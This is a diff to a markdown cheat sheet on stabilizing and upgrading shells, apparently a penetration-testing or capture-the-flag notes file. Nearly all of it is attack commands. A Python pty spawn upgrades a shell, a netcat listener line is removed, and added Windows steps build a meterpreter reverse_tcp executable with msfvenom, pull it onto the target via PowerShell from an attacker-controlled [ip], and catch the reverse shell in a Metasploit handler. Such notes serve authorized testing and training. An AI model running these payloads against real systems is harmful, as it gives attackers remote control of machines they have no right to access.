@@ -1,6 +1,8 @@
 # Shell stabilization
 
-## Using Python
+## Linux
+
+### Using Python
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -12,7 +14,15 @@ export TERM=xterm
 stty raw -echo; fg
 ```
 
-## Using rlwrap
+## Windows
+
+## Upgrade to meterpreter
 ```bash
-rlwrap nc -lvnp [port]
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] --platform windows -f exe > shell.exe
+
+powershell -c "Invoke-WebRequest -Uri 'http://[ip]:[port]/shell.exe' -OutFile 'shell.exe'"
+
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
 ```
